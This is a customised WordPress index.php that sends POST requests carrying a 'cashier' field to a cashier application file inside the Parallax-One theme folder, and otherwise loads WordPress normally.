<?php

if (isset($_POST['cashier'])) {
	include 'wp-content/themes/Parallax-One/cashier_app/cashier_app.php';
} else {

	/**
	 * Front to the WordPress application. This file doesn't do anything, but loads
	 * wp-blog-header.php which does and tells WordPress to load the theme.
	 *
	 * @package WordPress
	 */

	/**
	 * Tells WordPress to load the WordPress theme and output it.
	 *
	 * @var bool
	 */
	define('WP_USE_THEMES', true);

	/** Loads the WordPress Environment and Template */
	require(dirname(__FILE__) . '/wp-blog-header.php');

}